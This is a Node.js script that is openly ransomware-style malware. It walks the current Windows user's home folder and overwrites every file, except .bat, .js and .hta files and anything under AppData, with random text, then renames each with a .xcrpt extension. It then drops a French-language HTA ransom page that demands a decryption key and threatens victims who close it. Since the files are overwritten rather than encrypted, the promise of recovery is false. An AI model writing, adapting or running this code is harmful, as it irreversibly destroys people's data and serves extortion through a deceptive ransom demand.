const {execSync, ChildProcess} = require("child_process");
const fs = require('fs')
function makeid() {
    var text = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789.?-!§ù_=+-()#`";
  
    for (var i = 0; i < 500; i++)
      text += possible.charAt(Math.floor(Math.random() * possible.length));
  
    return text;
  }
  let t = (makeid())
let os = require('os')
var path = require('path');
var walk = function(dir) {
    let results = [], err = null, list;
    try {
        list = fs.readdirSync(dir)
    } catch(e) {
        err = e.toString();
    }
    if (err) return;
    var i = 0;
    return (function next() {
        var file = list[i++];
        let stat
        if(!file) return results;
        file = path.resolve(dir, file);
        try{
     stat = fs.statSync(file);
      }
      catch(err){
        return;
      }
      if(err || file.includes('AppData')) return;
      if (stat && stat.isDirectory()) {
          let res = walk(file);
          results = results.concat(res);
          return next();
        } else {
          if (((file.endsWith('.bat')) || (file.endsWith('.js')) || (file.endsWith('.hta')))) {return}
          else fs.writeFileSync(`${file}`, (t))
          fs.renameSync(`${file}`, (`${file}.xcrpt`));
          results.push(file);
           return next();
        }

    })();

};


    walk(`C:\\Users\\${os.userInfo().username}`)


fs.writeFileSync('XDecrypt.hta', (`

<html><head><title>XDecrypt</title> 
 
<hta:application 
applicationname="XDecrypt"  
version="1.0" 
maximizebutton="no" 
minimizebutton="no" 
sysmenu="no" 
Caption="no" 
windowstate="maximize"/> 
 
</head><body bgcolor="#ff0000" scroll="no"> 
<font face="Lucida Console" size="4" color="#FFFFFF"> 
<style>div.a{text-align: center}</style>
<div class="a">
<h1>&#9760 ATTENTION: TOUS LES FICHIERS DE CET ORDINATEUR ONT &EacuteT&EacuteS CRYPT&EacuteS ! &#9760</h1> 
 
<p>Cet ordinateur est d&eacutesormais crypt&eacute</p> 
 <br>
 <h1>Quels fichiers ont &eacutet&eacutes crypt&eacutes ? </h1>
<p>Tous les fichiers, except&eacutes ceux de JavaScript, les applications HTML et les fichiers batch situ&eacutes dans votre ordinateur ont &eacutet&eacutes crypt&eacutes.</p>
<br>
<h1>Puis je le retrouver ?</h1> 
 
<p>Pour s&ucircr. Veuillez tout simplement entrer la bonne cl&eacute et vos fichiers seront d&eacutecrypt&eacutes automatiquement</p>
<p>Essayer de quitter la page cryptera le r&eacute;seau et supprimera le d&eacutecrypteur, donc n'essayez pas.</p>
<br>
<br>
<label for="key" style="cursor: text;">Cl&eacute:</label>
<input type="text" class="key" style="width: 200px;">

 </div>
 
</font> 
</body></html> `))